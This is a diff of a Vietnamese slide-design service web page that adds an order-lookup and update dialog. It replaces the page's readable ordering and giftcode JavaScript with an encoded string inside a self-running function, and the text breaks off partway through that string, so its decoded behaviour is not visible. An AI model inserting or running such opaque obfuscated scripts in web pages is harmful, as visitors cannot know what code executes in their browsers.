@@ -28,6 +28,17 @@ footer{background:var(--footer-bg);border-top:3px solid var(--accent);color:var(
 dialog{border:0;padding:0;background:transparent;max-width:none;max-height:none;overflow:visible}dialog::backdrop{background:rgba(15,23,42,.62);backdrop-filter:blur(4px)}.modal{width:min(620px,calc(100vw - 32px));max-height:90vh;max-height:90dvh;background:#fff;border-radius:24px;padding:32px 36px;box-shadow:0 25px 60px -15px rgba(0,0,0,.2);overflow-y:auto;overscroll-behavior:contain;border:1px solid #e2e8f0;color:var(--text)}.modal-head{display:flex;justify-content:space-between;align-items:flex-start;gap:16px;margin-bottom:20px}.modal h2{font-size:1.65rem;font-weight:800;color:#0f172a;margin:0;letter-spacing:-.02em}.close{background:#eff6ff;color:#1d4ed8;border:0;border-radius:10px;width:36px;height:36px;font-size:1.25rem;font-weight:bold;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0}.modal-intro{color:#64748b;font-size:.95rem;margin:6px 0 0}.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:18px 16px}.field{display:flex;flex-direction:column;gap:7px}.field.full{grid-column:1/-1}.field label{font-size:.9rem;font-weight:600;color:#334155}.field input,.field select,.field textarea{width:100%;border:1px solid #cbd5e1;background:#f8fafc;color:#0f172a;border-radius:12px;padding:13px 16px;font:inherit;font-size:.95rem;transition:all .2s}.field input:focus,.field select:focus,.field textarea:focus{border-color:#0284c7;background:#fff;box-shadow:0 0 0 3px #0284c71f}.field textarea{min-height:110px;resize:vertical}.giftcode-box{display:flex;gap:10px}.giftcode-box input{flex:1;text-transform:uppercase}.giftcode-box button{padding:0 24px;background:#006b8c;color:#fff;border:0;border-radius:12px;font-weight:750;font-size:.95rem;cursor:pointer;white-space:nowrap}.giftcode-box button:hover{background:#00536e}.total-box{background:#f0f7ff;border:1px solid #dbeafe;border-radius:14px;padding:16px 18px;margin:20px 0 16px;display:flex;flex-direction:column;gap:8px}.total-row{display:flex;justify-content:space-between;align-items:center;gap:10px;font-size:.95rem;color:#334155}.total-row.final{font-size:1.1rem;font-weight:800;color:#075985;border-top:1px dashed #cbd5e1;padding-top:10px;margin-top:4px}.notice{font-size:.85rem;color:#64748b;margin:8px 0}.notice a{color:#0369a1;text-decoration:underline}.success,.error{display:none;padding:14px;border-radius:12px;margin-top:14px;overflow-wrap:anywhere}.success{border:1px solid #a7f3d0;background:#ecfdf5;color:#065f46}.error{color:#991b1b;background:#fef2f2;border:1px solid #fecaca;font-size:.9rem}.success.show,.error.show{display:block}.code-msg{font-size:.85rem;margin-top:4px;color:#075985}.hint{font-size:.82rem;color:#991b1b;margin:0}.policy-body{margin-top:15px;color:var(--text);font-size:.95rem;line-height:1.7;max-height:60vh;overflow-y:auto}.policy-body h4{margin:14px 0 6px;color:var(--accent)}.policy-body p{margin:0 0 10px;color:var(--muted)}.consent{display:flex;gap:10px;align-items:flex-start;font-size:.88rem;color:#334155}.consent input{margin-top:5px}.honeypot{position:absolute!important;left:-10000px!important;width:1px!important;height:1px!important;overflow:hidden!important}
 @media(max-width:760px){.hero{grid-template-columns:1fr;padding:36px 0 50px}.preview{transform:none}.cards,.how{grid-template-columns:1fr}.hero h1{font-size:3rem}.form-grid{grid-template-columns:1fr}.field.full{grid-column:auto}.nav{padding:17px 0}.footer-grid{grid-template-columns:repeat(2,minmax(0,1fr));gap:28px 20px}footer{padding-top:36px}.modal{padding:24px 20px}}@media(max-width:420px){.footer-grid{gap:24px 14px}.footer-brand{font-size:1.1rem}.giftcode-box{flex-wrap:wrap}.giftcode-box button{width:100%;height:46px}.hero h1{font-size:clamp(2.25rem,11vw,3rem)}.mini-stats{gap:7px}.mini-stats div{padding:10px 6px}.mini-stats strong{font-size:1.05rem}.modal{max-height:94vh;max-height:94dvh;border-radius:18px}}@supports(padding:max(0px)){main{padding-top:max(0px,env(safe-area-inset-top));padding-left:max(0px,env(safe-area-inset-left));padding-right:max(0px,env(safe-area-inset-right))}footer{padding-left:max(0px,env(safe-area-inset-left));padding-right:max(0px,env(safe-area-inset-right))}}@media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}*,*::before,*::after{animation-duration:.01ms!important;transition-duration:.01ms!important;scroll-behavior:auto!important}}
 
+/* ===== Cập nhật đơn hàng ===== */
+[hidden]{display:none!important}
+.hero>*{min-width:0}.hero h1{overflow-wrap:anywhere}html,body{overflow-x:clip}
+@media(max-width:480px){.hero h1{font-size:clamp(1.9rem,9.2vw,2.6rem)}}
+.fab-update{position:fixed;right:max(16px,env(safe-area-inset-right));bottom:max(16px,env(safe-area-inset-bottom));z-index:900;border:0;border-radius:99px;padding:13px 20px;font-weight:800;color:#fff;background:linear-gradient(135deg,var(--accent),#6a5cff);box-shadow:0 10px 30px #2563eb55;cursor:pointer;display:inline-flex;align-items:center;gap:8px;transition:transform .18s ease}.fab-update:hover{transform:translateY(-2px)}
+footer{padding-bottom:max(84px,calc(env(safe-area-inset-bottom) + 70px))}
+.code-chip{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-top:10px}.code-chip code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-weight:800;font-size:1.05rem;letter-spacing:.04em;background:#fff;border:1px dashed #34d399;border-radius:10px;padding:6px 12px;user-select:all}.code-chip button{border:1px solid #6ee7b7;background:#fff;color:#065f46;border-radius:10px;padding:7px 12px;font-weight:700;cursor:pointer}.code-chip button:hover{background:#d1fae5}
+.upd-fields{border:0;padding:0;margin:0;min-width:0}.upd-fields:disabled{opacity:.6}
+.order-meta{display:flex;flex-wrap:wrap;gap:8px 18px;align-items:center;background:#f0f7ff;border:1px solid #dbeafe;border-radius:14px;padding:12px 16px;margin-bottom:18px;font-size:.9rem;color:#334155}.order-meta code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-weight:800;color:#075985}.status-pill{display:inline-block;border-radius:99px;padding:2px 10px;font-size:.8rem;font-weight:700;background:#dcfce7;color:#166534}.status-pill.locked{background:#fef3c7;color:#92400e}
+.btn-row{display:flex;gap:10px;flex-wrap:wrap;margin-top:6px}.btn-row .btn{flex:1 1 180px}
+
 /* ===== Festive dialog 20/10 ===== */
 #festiveDialog{border:0;padding:0;background:transparent;max-width:none;max-height:none;overflow:visible;margin:auto}
 #festiveDialog::backdrop{background:rgba(60,10,35,.58);backdrop-filter:blur(5px)}
@@ -51,7 +62,7 @@ dialog{border:0;padding:0;background:transparent;max-width:none;max-height:none;
 <span class="eyebrow">✦ Thiết kế slide theo yêu cầu</span>
 <h1>Làm slide PowerPoint/Canva<br><em>theo yêu cầu của bạn.</em></h1>
 <p class="lead">Biến nội dung khô khan thành bài trình chiếu bắt mắt, chỉn chu và giàu tính thuyết phục. Tiết kiệm thời gian với chi phí minh bạch.</p>
-<div class="actions"><a class="btn primary" href="#goi">Xem gói dịch vụ</a><a class="btn secondary external-link" target="_blank" rel="noopener noreferrer">🎁 Xem mã giảm giá</a><a class="btn secondary email-link">Liên hệ qua Gmail</a></div>
+<div class="actions"><a class="btn primary" href="#goi">Xem gói dịch vụ</a><a class="btn secondary email-link">Liên hệ qua Gmail</a></div>
 <div class="promo"><strong>🎁 Săn mã giảm giá cho đơn hàng của bạn!</strong><p>Xem mã ưu đãi, sau đó nhập Giftcode trong biểu mẫu đặt hàng để kiểm tra mã.</p><a class="btn primary external-link" target="_blank" rel="noopener noreferrer">Xem ưu đãi ngay ↗</a></div>
 </div>
 <div class="preview" aria-hidden="true"><div class="preview-top"><span>SLIDE PREVIEW</span><span>01 / 08</span></div><div class="slide"><small>YOUR NEXT PRESENTATION</small><div><h2>Trình bày ý tưởng thật ấn tượng</h2><p>Rõ ràng · Hiện đại · Dễ theo dõi</p></div><small>SLIDECRAFT / 2026</small></div><div class="mini-stats"><div><strong>Từ 5.000đ</strong><span>Giá khởi điểm</span></div><div><strong>3 gói</strong><span>Dễ lựa chọn</span></div><div><strong>1:1</strong><span>Theo yêu cầu</span></div></div></div>
@@ -59,7 +70,7 @@ dialog{border:0;padding:0;background:transparent;max-width:none;max-height:none;
 <section id="goi"><div class="wrap"><div class="section-head"><h2>Chọn gói dịch vụ phù hợp</h2><p>Thiết kế chỉn chu, đúng hạn và tối ưu cho từng mục đích thuyết trình.</p></div><div class="cards" id="packageCards"></div></div></section>
 <section><div class="wrap"><div class="section-head"><h2>Quy trình đặt hàng đơn giản</h2><p>Chỉ với vài bước dễ dàng để sở hữu bài thuyết trình ưng ý.</p></div><div class="how"><div class="step"><div class="num">1</div><h3>Lựa chọn nhu cầu</h3><p>Chọn gói dịch vụ, nhập số slide và mô tả yêu cầu.</p></div><div class="step"><div class="num">2</div><h3>Áp mã &amp; Gửi đơn</h3><p>Nhập Giftcode, kiểm tra mức giảm và gửi yêu cầu đặt hàng.</p></div><div class="step"><div class="num">3</div><h3>Xác nhận &amp; Nhận bài</h3><p>Liên hệ qua Gmail để thống nhất chi tiết và nhận sản phẩm.</p></div></div></div></section>
 </main>
-<footer><div class="wrap"><div class="footer-grid"><div><div class="footer-brand">Slide<span>Craft.</span></div><p class="footer-description">Dịch vụ thiết kế slide PowerPoint/Canva theo yêu cầu, cá nhân hóa theo chủ đề và mục đích sử dụng.</p></div><div class="footer-column"><h3>MUA HÀNG</h3><div class="footer-links"><a href="#goi">Hướng dẫn mua hàng</a><button class="link-btn" id="footerOrder">Thiết kế theo yêu cầu</button><a class="external-link" target="_blank" rel="noopener noreferrer">🎁 Mã giảm giá ↗</a></div></div><div class="footer-column"><h3>SLIDECRAFT</h3><div class="footer-links"><a href="#main-content">Giới thiệu</a><a class="email-link">Liên hệ</a><a href="privacy.html">Chính sách bảo mật</a><a href="payment.html">Chính sách thanh toán</a><a href="terms.html">Điều khoản sử dụng</a><a href="refund.html">Chính sách hoàn tiền</a></div></div><div class="footer-column"><h3>THEO DÕI</h3><div class="footer-links"><a class="email-link">Gmail</a></div></div></div><div class="footer-bottom">© 2026 SlideCraft. Dịch vụ làm slide PowerPoint/Canva theo yêu cầu.</div></div></footer>
+<footer><div class="wrap"><div class="footer-grid"><div><div class="footer-brand">Slide<span>Craft.</span></div><p class="footer-description">Dịch vụ thiết kế slide PowerPoint/Canva theo yêu cầu, cá nhân hóa theo chủ đề và mục đích sử dụng.</p></div><div class="footer-column"><h3>MUA HÀNG</h3><div class="footer-links"><a href="#goi">Hướng dẫn mua hàng</a><button class="link-btn" id="footerOrder">Thiết kế theo yêu cầu</button><button class="link-btn" id="footerUpdate">Cập nhật đơn hàng</button><a class="external-link" target="_blank" rel="noopener noreferrer">🎁 Mã giảm giá ↗</a></div></div><div class="footer-column"><h3>SLIDECRAFT</h3><div class="footer-links"><a href="#main-content">Giới thiệu</a><a class="email-link">Liên hệ</a><a href="privacy.html">Chính sách bảo mật</a><a href="payment.html">Chính sách thanh toán</a><a href="terms.html">Điều khoản sử dụng</a><a href="refund.html">Chính sách hoàn tiền</a></div></div><div class="footer-column"><h3>THEO DÕI</h3><div class="footer-links"><a class="email-link">Gmail</a></div></div></div><div class="footer-bottom">© 2026 SlideCraft. Dịch vụ làm slide PowerPoint/Canva theo yêu cầu.</div></div></footer>
 <dialog id="orderDialog" aria-labelledby="modalTitle"><div class="modal"><div class="modal-head"><div><h2 id="modalTitle">Gửi yêu cầu đặt hàng</h2><p class="modal-intro">Điền thông tin bên dưới. Giá được tính theo gói và số slide.</p></div><button class="close" type="button" id="closeOrder" aria-label="Đóng">×</button></div>
 <form id="orderForm" novalidate><div class="form-grid">
 <div class="field"><label for="customer">Tên của bạn *</label><input id="customer" name="customer" autocomplete="name" required maxlength="100" placeholder="Tên / biệt danh"></div>
@@ -75,6 +86,28 @@ dialog{border:0;padding:0;background:transparent;max-width:none;max-height:none;
 </div>
 <div class="total-box"><div class="total-row"><span>Giá tạm tính:</span><strong id="initialTotal">5.000đ</strong></div><div class="total-row" id="discountRow" hidden><span>Giảm giá:</span><strong id="discountAmount">0đ</strong></div><div class="total-row final"><span>Thành tiền dự kiến:</span><strong id="finalTotal">5.000đ</strong></div></div>
 <p class="notice">Giá hiển thị là giá dự kiến. Vui lòng chờ email xác nhận trước khi thanh toán.</p><button class="btn primary submit-btn" type="submit" id="submitBtn">Gửi yêu cầu đặt hàng</button><div class="error" id="error" role="alert" tabindex="-1"></div><div class="success" id="success" role="status" tabindex="-1"></div></form></div></dialog>
+<button type="button" class="fab-update" id="fabUpdate" aria-label="Cập nhật đơn hàng bằng mã đơn">📦 Cập nhật đơn hàng</button>
+<dialog id="updateDialog" aria-labelledby="updateTitle"><div class="modal">
+<div class="modal-head"><div><h2 id="updateTitle">Cập nhật đơn hàng</h2><p class="modal-intro">Dán mã đơn hàng bạn nhận được khi gửi đơn để xem và chỉnh sửa yêu cầu hiện tại.</p></div><button class="close" type="button" id="closeUpdate" aria-label="Đóng">×</button></div>
+<form id="lookupForm" novalidate><div class="form-grid">
+<div class="field full"><label for="lookupCode">Mã đơn hàng *</label><div class="giftcode-box"><input id="lookupCode" name="orderCode" autocomplete="off" spellcheck="false" maxlength="30" placeholder="VD: SC-7K3M9QXD" required><button type="button" id="pasteCodeBtn">Dán mã</button></div></div>
+<div class="field full"><label for="lookupEmail">Email đã dùng khi đặt hàng *</label><input id="lookupEmail" name="email" type="email" autocomplete="email" maxlength="160" placeholder="ban@example.com" required><p class="notice" style="margin:0">Email dùng để xác minh bạn là chủ đơn hàng.</p></div>
+</div>
+<button class="btn primary submit-btn" type="submit" id="lookupBtn" style="margin-top:16px">Tra cứu đơn hàng</button><div class="error" id="lookupError" role="alert" tabindex="-1"></div></form>
+<form id="updateForm" novalidate hidden>
+<div class="order-meta"><span>Mã đơn: <code id="uCode"></code></span><span>Trạng thái: <span class="status-pill" id="uStatus"></span></span><span id="uTimes"></span></div>
+<fieldset class="upd-fields" id="uFields"><div class="form-grid">
+<div class="field"><label for="uPackage">Gói dịch vụ</label><select id="uPackage" name="package"></select></div>
+<div class="field"><label for="uBudget">Giá tạm tính</label><input id="uBudget" readonly class="readonly-input"></div>
+<div class="field"><label for="uSlides">Số lượng slide *</label><input id="uSlides" name="slides" type="number" min="5" max="8" required><p class="hint" id="uSlideHint" hidden>Vượt giới hạn, hãy chọn gói cao hơn</p></div>
+<div class="field"><label for="uDeadline">Hạn cần hoàn thành</label><input id="uDeadline" name="deadline" type="date"></div>
+<div class="field full"><label for="uTopic">Chủ đề / yêu cầu chi tiết *</label><textarea id="uTopic" name="topic" required maxlength="3000"></textarea></div>
+</div></fieldset>
+<div class="total-box"><div class="total-row"><span>Giá tạm tính:</span><strong id="uInitialTotal"></strong></div><div class="total-row" id="uDiscountRow" hidden><span id="uDiscountLabel">Giảm giá:</span><strong id="uDiscountAmount"></strong></div><div class="total-row final"><span>Thành tiền dự kiến:</span><strong id="uFinalTotal"></strong></div></div>
+<p class="notice" id="uNotice"></p>
+<div class="btn-row"><button class="btn primary" type="submit" id="uSaveBtn">Lưu cập nhật</button><button class="btn secondary" type="button" id="uBackBtn">Tra cứu mã khác</button></div>
+<div class="error" id="uError" role="alert" tabindex="-1"></div><div class="success" id="uSuccess" role="status" tabindex="-1"></div>
+</form></div></dialog>
 <dialog id="festiveDialog" aria-label="Thông báo ưu đãi">
 <div class="fv-box">
 <button type="button" class="fv-close" id="fvClose" aria-label="Đóng quảng cáo">&times;</button>
@@ -82,134 +115,258 @@ dialog{border:0;padding:0;background:transparent;max-width:none;max-height:none;
 <div class="fv-foot"><label class="fv-skip"><input type="checkbox" id="fvSkip"><span>Không hiện lại hôm nay</span></label></div>
 </div>
 </dialog>
-<script>
-'use strict';
-const CONFIG = Object.freeze({
-  scriptUrl: 'https://script.google.com/macros/s/AKfycbzzJiD0U_iHWPJT4ih2SfN9iUrwSQvGlPl-zgDTIzUrtJVgEC-iz8QmHXPGguuCtQVL/exec',
-  email: 'chiasefile9@gmail.com',
-  canvaUrl: 'https://www.canva.com/design/DAHXzQuoxVw/ODnUMu7WlZmMWAbn7T62ZQ/view?utm_content=DAHXzQuoxVw&utm_campaign=designshare&utm_medium=link&utm_source=viewer'
-});
-const packageConfig = Object.freeze({
-  'Cơ bản': {basePrice:5000,baseSlides:5,minSlides:5,maxSlides:8,title:'Tinh gọn & Tối giản',tag:'CƠ BẢN',summary:'Giải pháp gọn gàng cho bài tập nhóm, báo cáo ngắn hoặc chỉnh sửa slide có sẵn.',features:['Căn chỉnh bố cục, font chữ sạch đẹp','Phối màu hài hòa theo chủ đề','1 lượt chỉnh sửa miễn phí','Thời gian giao: 1–2 ngày']},
-  'Chuyên nghiệp': {basePrice:15000,baseSlides:10,minSlides:10,maxSlides:15,title:'Chuyên nghiệp & Đồng bộ',tag:'ĐƯỢC CHỌN NHIỀU NHẤT',summary:'Thiết kế thẩm mỹ cao giúp bài thuyết trình nổi bật và dễ theo dõi.',features:['Phong cách thiết kế hiện đại','Minh họa bằng icon và hình ảnh','2 lượt chỉnh sửa miễn phí','Thời gian giao: 2–3 ngày']},
-  'Nâng cao': {basePrice:30000,baseSlides:20,minSlides:20,maxSlides:200,title:'Sáng tạo & Độc bản',tag:'NÂNG CAO',summary:'Dành cho bảo vệ khóa luận, dự án quan trọng hoặc bài trình bày chuyên sâu.',features:['Thiết kế cá nhân hóa theo chủ đề','Infographic và biểu đồ','3 lượt chỉnh sửa miễn phí','Thời gian giao: 3–5 ngày']}
-});
-const $ = id => document.getElementById(id);
-const dialog = $('orderDialog');
-let appliedDiscount=0, appliedCode='', checkingCode=false, codeRequestToken=0, orderCloseTimer=null, lastFocus=null;
-function money(n){return Math.max(0,Number(n)||0).toLocaleString('vi-VN')+'đ'}
-function priceFor(pkg,slides){const c=packageConfig[pkg];return c.basePrice+Math.max(0,slides-c.baseSlides)*2000}
-function getCalculatedBudget(){const pkg=$('package').value,c=packageConfig[pkg];let n=Number($('slides').value);if(!Number.isInteger(n))n=c.baseSlides;return priceFor(pkg,n)}
-function renderPackages(){
- const root=$('packageCards'); root.replaceChildren();
- Object.entries(packageConfig).forEach(([name,c],i)=>{
-  const article=document.createElement('article');article.className='card'+(i===1?' featured':'');
-  const box=document.createElement('div'),tag=document.createElement('span'),h=document.createElement('h3'),price=document.createElement('div'),small=document.createElement('small'),p=document.createElement('p'),ul=document.createElement('ul'),button=document.createElement('button');
-  tag.className='tag';tag.textContent=c.tag;h.textContent=c.title;price.className='price';price.append(document.createTextNode(money(c.basePrice)+' '));small.textContent='/ '+c.baseSlides+' slide';price.append(small);p.textContent=c.summary;
-  [...c.features,`Giới hạn ${c.minSlides}–${c.maxSlides} slide; thêm slide +2.000đ/slide`].forEach(t=>{const li=document.createElement('li');li.textContent=t;ul.append(li)});
-  box.append(tag,h,price,p,ul);button.type='button';button.className='btn '+(i===1?'primary':'secondary');button.textContent='Chọn gói này';button.addEventListener('click',()=>openOrder(name));article.append(box,button);root.append(article);
- });
- $('package').replaceChildren(...Object.keys(packageConfig).map(name=>{const o=document.createElement('option');o.value=name;o.textContent=name;return o}));
-}
-function setError(message){const el=$('error');el.textContent=message;el.classList.add('show');el.focus();el.scrollIntoView({behavior:'smooth',block:'nearest'})}
-function clearError(){ $('error').textContent='';$('error').classList.remove('show') }
-function setModalOpen(open){
- if(open){if(dialog.open)return;lastFocus=document.activeElement;dialog.showModal();$('customer').focus()}
- else if(dialog.open){dialog.close();if(lastFocus&&typeof lastFocus.focus==='function')lastFocus.focus()}
-}
-function openOrder(pkg='Chuyên nghiệp'){
- if(orderCloseTimer){clearTimeout(orderCloseTimer);orderCloseTimer=null}
- $('orderForm').reset();$('package').value=packageConfig[pkg]?pkg:'Chuyên nghiệp';
- const c=packageConfig[$('package').value];$('slides').min=c.minSlides;$('slides').max=c.maxSlides;$('slides').value=c.baseSlides;
- resetGiftcode(false);clearError();$('success').classList.remove('show');$('success').textContent='';updateTotalView();setModalOpen(true)
-}
-function closeOrder(){if(orderCloseTimer){clearTimeout(orderCloseTimer);orderCloseTimer=null}setModalOpen(false)}
-function resetGiftcode(clearInput=true){
- codeRequestToken++;checkingCode=false;appliedDiscount=0;appliedCode='';
- if(clearInput)$('giftcode').value='';
- $('applyCodeBtn').disabled=false;$('discountRow').hidden=true;$('codeMsg').textContent='';updateTotalView()
-}
-function updateTotalView(){const budget=getCalculatedBudget();$('budget').value=money(budget);$('initialTotal').textContent=money(budget);$('finalTotal').textContent=money(Math.max(0,budget-appliedDiscount));$('discountRow').hidden=!(appliedDiscount>0);$('discountAmount').textContent='-'+money(appliedDiscount)}
-function onPackageOrSlidesChanged(){
- const c=packageConfig[$('package').value];$('slides').min=c.minSlides;$('slides').max=c.maxSlides;
- const n=Number($('slides').value);$('slideHint').hidden=!(Number.isFinite(n)&&(n<c.minSlides||n>c.maxSlides));
- resetGiftcode(true);$('codeMsg').textContent='Gói hoặc số slide đã thay đổi. Vui lòng áp dụng lại Giftcode nếu cần.';updateTotalView()
-}
-async function postToScript(data){
- if(!CONFIG.scriptUrl||CONFIG.scriptUrl.includes('PASTE_NEW_'))throw new Error('Website chưa được cấu hình URL Apps Script. Vui lòng liên hệ quản trị viên.');
- const controller=new AbortController(), timer=setTimeout(()=>controller.abort(),15000);
- try{
-  const response=await fetch(CONFIG.scriptUrl,{method:'POST',headers:{'Content-Type':'text/plain;charset=utf-8'},body:JSON.stringify(data),signal:controller.signal});
-  const text=await response.text();let result;
-  try{result=JSON.parse(text)}catch(_){throw new Error('Máy chủ trả về dữ liệu không hợp lệ. Vui lòng thử lại sau.')}
-  if(!response.ok)throw new Error('Không thể kết nối máy chủ. Vui lòng thử lại sau.');
-  if(result.ok===false&&!result.valid)throw new Error(result.error||result.message||'Yêu cầu không hợp lệ.');
-  return result;
- }catch(e){if(e.name==='AbortError')throw new Error('Yêu cầu quá thời gian chờ (15 giây). Hãy kiểm tra kết nối mạng rồi thử lại.');if(e instanceof TypeError)throw new Error('Không thể kết nối máy chủ. Hãy kiểm tra mạng và thử lại.');throw e}
- finally{clearTimeout(timer)}
-}
-async function applyGiftcode(){
- const code=$('giftcode').value.trim().toUpperCase(), budget=getCalculatedBudget(), token=++codeRequestToken;
- if(!code){resetGiftcode(false);$('codeMsg').textContent='Vui lòng nhập mã giảm giá.';return}
- checkingCode=true;$('applyCodeBtn').disabled=true;$('codeMsg').textContent='Đang kiểm tra mã...';
- try{
-  const data=await postToScript({action:'validateGiftcode',code,package:$('package').value,slides:Number($('slides').value)});
-  if(token!==codeRequestToken)return;
-  if(getCalculatedBudget()!==budget){resetGiftcode(false);$('codeMsg').textContent='Giá đã thay đổi, vui lòng áp lại mã';return}
-  if(data.valid){const discount=Number(data.discount);if(!Number.isFinite(discount)||discount<=0)throw new Error('Mã giảm giá không hợp lệ.');appliedDiscount=Math.min(budget,discount);appliedCode=data.code||code;$('codeMsg').textContent='Đã áp dụng mã thành công! Giảm '+money(appliedDiscount)}
-  else{appliedDiscount=0;appliedCode='';$('codeMsg').textContent=data.message||'Mã không hợp lệ hoặc đã hết hạn.'}
-  updateTotalView()
- }catch(e){if(token===codeRequestToken){appliedDiscount=0;appliedCode='';updateTotalView();$('codeMsg').textContent=e.message||'Không kiểm tra được mã. Vui lòng thử lại.'}}
- finally{if(token===codeRequestToken){checkingCode=false;$('applyCodeBtn').disabled=false}}
-}
-$('package').addEventListener('input',()=>{const c=packageConfig[$('package').value];if(!c)return;$('slides').value=c.baseSlides;onPackageOrSlidesChanged()});
-$('package').addEventListener('change',()=>{const c=packageConfig[$('package').value];if(c){$('slides').value=c.baseSlides;onPackageOrSlidesChanged()}});
-$('slides').addEventListener('input',onPackageOrSlidesChanged);$('slides').addEventListener('change',()=>{
- const c=packageConfig[$('package').value];let n=Number($('slides').value);if(Number.isInteger(n)){$('slides').value=Math.max(c.minSlides,Math.min(c.maxSlides,n));}
- $('slideHint').hidden=true;updateTotalView()
-});
-$('applyCodeBtn').addEventListener('click',applyGiftcode);
-$('giftcode').addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();applyGiftcode()}});
-$('closeOrder').addEventListener('click',closeOrder);$('footerOrder').addEventListener('click',()=>openOrder('Chuyên nghiệp'));
-dialog.addEventListener('click',e=>{if(e.target===dialog)closeOrder()});
-document.addEventListener('keydown',e=>{if(e.key==='Escape'&&dialog.open)closeOrder()});
-$('orderForm').addEventListener('submit',async e=>{
- e.preventDefault();clearError();$('success').classList.remove('show');
- if(!$('orderForm').reportValidity())return;
- if($('website').value){setError('Không thể xử lý yêu cầu.');return}
- if(checkingCode){setError('Vui lòng chờ kiểm tra mã giảm giá hoàn tất.');return}
- const typedCode=$('giftcode').value.trim();
- if(typedCode&&(!appliedCode||typedCode.toUpperCase()!==appliedCode.toUpperCase())){setError('Bạn đã nhập Giftcode nhưng chưa áp dụng thành công. Hãy bấm “Áp dụng” trước khi gửi đơn.');$('giftcode').focus();return}
- const pkg=$('package').value,c=packageConfig[pkg],slides=Number($('slides').value);
- if(!Number.isInteger(slides)||slides<c.minSlides||slides>c.maxSlides){setError('Số slide vượt giới hạn của gói. Vui lòng chọn gói cao hơn hoặc điều chỉnh số slide.');$('slides').focus();return}
- const btn=$('submitBtn'),key=crypto.randomUUID?crypto.randomUUID():String(Date.now())+'-'+Math.random().toString(36).slice(2);
- const payload={action:'submitOrder',customer:$('customer').value,email:$('email').value,package:pkg,slides,deadline:$('deadline').value,topic:$('topic').value,giftcode:appliedCode,website:$('website').value,consent:$('consent').checked,idempotencyKey:key};
- btn.disabled=true;btn.textContent='Đang gửi yêu cầu...';
- try{
-  const result=await postToScript(payload);
-  if(!result.ok)throw new Error(result.error||'Gửi đơn hàng không thành công.');
-  $('success').textContent='Gửi yêu cầu thành công! Vui lòng chờ email xác nhận.';$('success').classList.add('show');$('success').focus();
-  $('orderForm').reset();resetGiftcode();const fresh=packageConfig['Chuyên nghiệp'];$('package').value='Chuyên nghiệp';$('slides').min=fresh.minSlides;$('slides').max=fresh.maxSlides;$('slides').value=fresh.baseSlides;updateTotalView();
-  if(orderCloseTimer)clearTimeout(orderCloseTimer);orderCloseTimer=setTimeout(()=>{orderCloseTimer=null;closeOrder()},4000)
- }catch(err){setError(err.message||'Không thể gửi đơn hàng. Nếu lỗi tiếp diễn, vui lòng liên hệ '+CONFIG.email+'.')}
- finally{btn.disabled=false;btn.textContent='Gửi yêu cầu đặt hàng'}
-});
-document.querySelectorAll('.external-link').forEach(a=>a.href=CONFIG.canvaUrl);
-document.querySelectorAll('.email-link').forEach(a=>a.href='mailto:'+CONFIG.email);
-const today=new Date();today.setMinutes(today.getMinutes()-today.getTimezoneOffset());$('deadline').min=today.toISOString().slice(0,10);
-renderPackages();$('package').value='Chuyên nghiệp';$('slides').min=1;$('slides').max=15;$('slides').value=10;updateTotalView();
-
-/* ===== Festive dialog 20/10 ===== */
-(()=>{
- const FV={delay:1200,hideKey:'sc_fv_2010_hidden_until',endDate:'2027-12-31T23:59:59'};
- const pop=$('festiveDialog');if(!pop||new Date()>new Date(FV.endDate))return;
- const store={get(){try{return Number(localStorage.getItem(FV.hideKey))||0}catch(e){return 0}},set(v){try{localStorage.setItem(FV.hideKey,String(v))}catch(e){}}};
- function endOfToday(){const d=new Date();d.setHours(23,59,59,999);return d.getTime()}
- function closeFv(){if($('fvSkip').checked)store.set(endOfToday());if(pop.open)pop.close()}
- $('fvClose').addEventListener('click',closeFv);
- pop.addEventListener('click',e=>{if(e.target===pop)closeFv()});
- if(store.get()>Date.now())return;
- setTimeout(()=>{if(!dialog.open&&!pop.open)pop.showModal()},FV.delay);
-})();
-</script>
+<script>(function(){var d="MkNMQl0RRRBHXVVCFQI7VVcKSkUYcnkqc31xFg8ZflRSAVpFFldEAVBOUx5JMxEWSwdLWEhFYxZZDhYRWk1FRkteFh5LUkQNRUAYUV1WVlpdSlpeVR5bBVZG"+
+"WUUdSh53cwJAUlpLTC5ccAZjbVB5YWgubQVRWQQ3U3oPX2dLRmVpEn5daF0bHlJwYn9IbENCcjJedHscXx4NZVt+aml2UU0RekVpZ3pLUExTVRUVOxYYAVRQ"+
+"UV0MRBJXXl9TSlRQUQhcCHhWWwVcWBhVXVQWGjJEGVJZX0AFYEZaDBIeWUJMFEoLFx5BE0IaVVdcT1AYWwtUHlxURQ1SWhlyc3FpTGkRVkluRhkrcVpje0cO"+
+"ZlpiCXRmeVNYU2ECBGxjFkdfXRMGRExcaQdaWkJTXE0McnksYUtpRFkcY0MQQ0ZUblVZCUlQUVZYWVFRRV9VV0JeWRZcF01FWztYUVJfR1QMWlEKUhdNRVs7"+
+"RltDRFFcDEBRAU5UShY8GRwPPFVdV0JCGBRYUlNQUQF2W1hQW14RCxgrW1tdUkJKU0ZTU0hcGU0yRBkWe/eXRFfVjJVcHgsWQwZYQl1hRA1WUQwDAgkBGloF"+
+"SlRrXV8AUEcMAx5UWFhrCFBVXUIMURlZV05hVVhSXRcDCRRFXxBZUQwRZlBfXhgD2Iq1XxZCFWDXjaNQEVFRhYOSVhYaEFRTDBFx/5EWeoWDk3YWGhdAWVtX"+
+"QEALEX8N2IubWBYUXfeXRhJe0I21ChlW+5FYAxVXXlkSW/KWUURN0IKcRkRbXPWFXxURVPvFVhFb8pcLFVpR14iWXxZQC9iLj1IWB13Vjb9cURFF2d+UUBhC"+
+"Wg1RURZV8YoRRdnejF8WFhoCUFVCQ0BcQgxjQ3r1u18WB13Vjb9cURFU2d+oEVvQjcFWGBZQXVdFFlsM2IqXEUWFj5VVXhL9oNeC3UkWFBZmDNSPp18SVPKW"+
+"TURR8phYFgz2hlcWRlFUWRgHUdCDlhagpNWNtxUVFgcYCP+B2YqVEBVXXteJsF9eGBfYipVQFglc1Y2zXBlBXvvJHh0fZV6FjqlfFlVQUFgYA1BQVwsWVde0"+
